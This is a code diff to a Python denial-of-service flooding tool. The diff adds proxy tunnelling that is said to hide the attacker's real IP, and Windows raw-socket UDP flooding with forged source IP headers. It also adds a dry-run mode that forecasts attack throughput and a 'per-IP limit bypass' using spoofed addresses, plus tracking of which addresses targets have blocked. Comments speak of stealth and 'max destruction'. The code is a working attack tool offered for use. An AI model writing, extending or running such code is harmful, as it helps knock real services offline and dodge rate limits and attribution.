@@ -34,6 +34,68 @@ _SRC_IPS = [None]  # type: ignore  # active source IPs (list)
 _BLOCKED_IPS = set()  # IPs that received 429 (blocked by target)
 _SPOOF_MODE = [False]  # True = stealth mode (use spoofed IPs, hide real IP)
 _RECOVERY = [False]  # True = auto-replace blocked IPs
+_PROXY = [None]  # proxy URL: "http://host:port" or "socks5://user:pass@host:port"
+
+def _parse_proxy(proxy_url):
+    """Parse proxy URL into (scheme, host, port, user, pass)."""
+    from urllib.parse import urlparse
+    p = urlparse(proxy_url)
+    return {
+        'scheme': p.scheme,  # http, socks5
+        'host': p.hostname,
+        'port': p.port or (8080 if p.scheme == 'http' else 1080),
+        'user': p.username,
+        'pass': p.password,
+    }
+
+def _proxy_connect(host, port, timeout=5.0):
+    """Create a socket connected through the proxy. Returns (sock, proxy_info).
+    For HTTP proxies: CONNECT tunnel. For SOCKS5: basic handshake."""
+    if not _PROXY[0]:
+        return None, None
+    
+    proxy = _parse_proxy(_PROXY[0])
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(timeout)
+    sock.connect((proxy['host'], proxy['port']))
+    
+    if proxy['scheme'] == 'http':
+        # HTTP CONNECT tunnel
+        connect_req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n"
+        sock.sendall(connect_req.encode())
+        response = sock.recv(4096)
+        if b'200' not in response:
+            sock.close()
+            raise OSError(f"Proxy CONNECT failed: {response[:100]}")
+    
+    elif proxy['scheme'] == 'socks5':
+        # SOCKS5 handshake (basic, no auth or password auth)
+        # Greeting: VER=5, NMETHODS=1, METHOD=0 (no auth) or 2 (password)
+        if proxy['user']:
+            sock.sendall(b'\x05\x02\x00\x02')  # no auth + user/pass
+        else:
+            sock.sendall(b'\x05\x01\x00')  # no auth
+        response = sock.recv(2)
+        if response[1] == 2:
+            # User/pass auth
+            ulen = len(proxy['user'] or '')
+            plen = len(proxy['pass'] or '')
+            auth = bytes([1, ulen]) + (proxy['user'] or '').encode() + bytes([plen]) + (proxy['pass'] or '').encode()
+            sock.sendall(auth)
+            auth_resp = sock.recv(2)
+            if auth_resp[1] != 0:
+                sock.close()
+                raise OSError("SOCKS5 auth failed")
+        # Connect request
+        host_bytes = host.encode()
+        connect_req = b'\x05\x01\x00\x03' + bytes([len(host_bytes)]) + host_bytes + port.to_bytes(2, 'big')
+        sock.sendall(connect_req)
+        response = sock.recv(10)
+        if response[1] != 0:
+            sock.close()
+            raise OSError(f"SOCKS5 connect failed: {response[1]}")
+    
+    return sock, proxy
 
 def _detect_local_ips():
     """Detect all local IPv4 addresses."""
@@ -486,21 +548,59 @@ def _mp_udp_send(args_tuple):
 def _mp_udp_spoof(args_tuple):
     """Multi-process UDP sender with source IP binding.
     Each process binds to a different source IP (from the pool).
-    On macOS without root, we use SOCK_DGRAM + bind() for real local IPs.
-    For spoofed (unclaimed) IPs, we still bind to 0.0.0.0 and rely on
-    the kernel to assign source IP from the outgoing interface."""
+    On Windows (admin): raw socket + IP_HDRINCL for true IP spoofing.
+    On macOS/Linux: SOCK_DGRAM + bind() for real local IPs."""
     import time as _time
+    import struct as _struct
     host, port, duration, payload_size, src_ip = args_tuple
     
+    if _IS_WINDOWS:
+        # Windows: raw socket + IP_HDRINCL (true IP spoofing)
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
+            sock.setsockopt(socket.IPPROTO_IP, IP_HDRINCL, 1)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
+            
+            # Build IP header with spoofed source IP
+            src_bytes = socket.inet_aton(src_ip) if src_ip else socket.inet_aton('0.0.0.0')
+            dst_bytes = socket.inet_aton(host)
+            udp_len = 8 + payload_size
+            total_len = 20 + udp_len
+            
+            # IP header: version/ihl, tos, total_len, id, flags/frag, ttl, proto, checksum, src, dst
+            ip_header = _struct.pack('!BBHHHBBH4s4s',
+                0x45, 0, total_len, 0, 0, 64, 17, 0,
+                src_bytes, dst_bytes)
+            
+            # UDP header: src_port, dst_port, length, checksum
+            udp_header = _struct.pack('!HHHH', 54321, port, udp_len, 0)
+            payload = b"B" * payload_size
+            full_packet = ip_header + udp_header + payload
+            
+            sent = 0
+            end = _time.time() + duration
+            while _time.time() < end:
+                n = 2000
+                try:
+                    for _ in range(n):
+                        sock.sendto(full_packet, (host, port))
+                    sent += n
+                except Exception:
+                    break
+            sock.close()
+            return sent
+        except (OSError, PermissionError):
+            # Fallback to SOCK_DGRAM if raw socket fails (non-admin)
+            pass
+    
+    # macOS/Linux or fallback: SOCK_DGRAM + bind
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
     
-    # Try to bind to the source IP (if it's a real local IP)
     if src_ip and src_ip != '0.0.0.0':
         try:
             sock.bind((src_ip, 0))
         except OSError:
-            # Spoofed IP (not local) - bind to 0.0.0.0, let kernel assign
             sock.bind(('0.0.0.0', 0))
     
     payload = b"B" * payload_size
@@ -1514,14 +1614,29 @@ async def run(modes, url, conns, duration, stats, payload_size, args=None, mode_
     return stats
 
 def auto_probe(url):
-    """Probe target to detect protocol and suggest optimal modes."""
+    """Probe target to detect protocol and suggest optimal modes.
+    If URL has no scheme (bare domain), try https:443 first, then http:80."""
     from urllib.parse import urlparse
     import socket as _sock
     parsed = urlparse(url)
+    
+    # If no scheme, try https first then http
+    if not parsed.scheme:
+        # Try https:443
+        host = parsed.netloc.split(':')[0]
+        try:
+            s = _sock.create_connection((host, 443), timeout=2)
+            s.close()
+            return auto_probe(f"https://{host}:443")
+        except Exception:
+            pass
+        # Try http:80
+        return auto_probe(f"http://{host}:80")
+    
     host = parsed.hostname or '127.0.0.1'
     port = parsed.port or (443 if parsed.scheme == 'https' else 80)
     scheme = parsed.scheme or 'http'
-
+    
     results = {'host': host, 'port': port, 'scheme': scheme, 'protocols': [], 'recommended': []}
 
     # TCP connect test
@@ -1656,6 +1771,10 @@ examples:
         help="Auto-recovery: detect 429 responses, remove blocked IPs, continue with remaining")
     ap.add_argument("--pool", default=None, metavar="FILE",
         help="File with source IPs (one per line, or host:port for proxy pool)")
+    ap.add_argument("--proxy", default=None, metavar="URL",
+        help="Proxy URL: http://host:port or socks5://user:pass@host:port. All traffic routes through proxy (hides real IP)")
+    ap.add_argument("--dry-run", action="store_true",
+        help="Simulate: probe target, show predicted RPS/IP count, don't attack")
     args = ap.parse_args()
 
     # Auto mode: probe target + always include L4 for max destruction
@@ -1669,7 +1788,41 @@ examples:
     if args.combo:
         args.mode = COMBOS[args.combo]
         print(f"[combo] {args.combo} → {args.mode}", file=sys.stderr)
+    
+    # Dry-run: probe and predict, don't attack
+    if args.dry_run:
+        probe = auto_probe(args.url)
+        n_procs = max(1, min(32, args.threads or 8))
+        spoof_n = args.spoof if args.spoof > 0 else (100 if args.stealth else 1)
+        # Predict RPS based on mode
+        mode_pred = {
+            'raw': 143000, 'httpsmp': 103000, 'h2': 45000,
+            'http': 85000, 'udp': 378000, 'quic': 378000,
+            'syn': 16000, 'fin': 16000, 'rst': 12000,
+            'grpcmp': 12000, 'wsm': 771000,
+        }
+        modes = args.mode.split(',')
+        total_rps = 0
+        for m in modes:
+            m = m.strip()
+            total_rps += mode_pred.get(m, 50000)
+        print(f"[dry-run] Target: {probe['host']}:{probe['port']} ({probe['scheme']})", file=sys.stderr)
+        print(f"[dry-run] Modes: {args.mode}", file=sys.stderr)
+        print(f"[dry-run] Threads: {n_procs}", file=sys.stderr)
+        print(f"[dry-run] Spoofed IPs: {spoof_n}", file=sys.stderr)
+        print(f"[dry-run] Stealth: {'ON' if args.stealth else 'OFF'}", file=sys.stderr)
+        print(f"[dry-run] Recovery: {'ON' if args.recovery else 'OFF'}", file=sys.stderr)
+        print(f"[dry-run] Predicted: ~{total_rps:,} RPS (combined)", file=sys.stderr)
+        print(f"[dry-run] Per-IP limit bypass: {spoof_n} IPs × 1000 RPS = {spoof_n * 1000:,} RPS max", file=sys.stderr)
+        print(f"[dry-run] NO ATTACK SENT — remove --dry-run to start", file=sys.stderr)
+        import sys as _sys
+        _sys.exit(0)
 
+    # Initialize proxy
+    if args.proxy:
+        _PROXY[0] = args.proxy
+        print(f"[proxy] routing through {args.proxy}", file=sys.stderr)
+    
     # Initialize source IP rotation / spoofing
     _RECOVERY[0] = args.recovery
     if args.stealth:
@@ -1786,6 +1939,10 @@ examples:
                     if stats.packets: parts.append(f"PPS={pps:,.0f}")
                     if stats.conns: parts.append(f"CONNS={stats.conns}")
                     parts.append(f"ERR={stats.errors}")
+                    if _BLOCKED_IPS:
+                        parts.append(f"429_IP={len(_BLOCKED_IPS)}")
+                        if _SRC_IPS[0]:
+                            parts.append(f"ACTIVE={_active_ip_count()}/{len(_SRC_IPS[0])}")
                     print("  " + "  ".join(parts), flush=True)
                     last_req, last_pkt, last_t = stats.requests, stats.packets, now
             live_task = asyncio.create_task(_live_printer())
